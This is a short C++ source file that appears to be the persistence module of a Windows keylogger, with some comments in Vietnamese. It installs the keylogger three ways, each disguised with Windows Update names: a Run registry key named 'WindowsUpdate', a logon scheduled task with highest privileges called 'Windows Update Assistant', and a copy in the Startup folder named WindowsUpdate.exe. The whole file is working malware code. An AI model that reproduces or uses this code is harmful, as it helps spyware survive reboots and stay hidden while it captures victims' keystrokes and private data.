#include "../persistence.h"

void Persistence() {
    // Registry persistence
    HKEY nKey = NULL;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, (KEY_CREATE_SUB_KEY | KEY_SET_VALUE), NULL, &nKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(nKey, "WindowsUpdate", 0, REG_SZ, (LPBYTE)keylogger.c_str(), keylogger.length());
        RegCloseKey(nKey);
    }

    // Task Scheduler persistence as backup (cần quyền admin)
    std::string command = "schtasks /create /tn \"Windows Update Assistant\" /tr \"" + keylogger + "\" /sc onlogon /rl highest /f";
    system(command.c_str());

    // Sao chép file vào startup folder (phương pháp dự phòng thứ ba)
    char startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        std::string startupFile = std::string(startupPath) + "\\WindowsUpdate.exe";
        CopyFileA(keylogger.c_str(), startupFile.c_str(), FALSE);
    }
}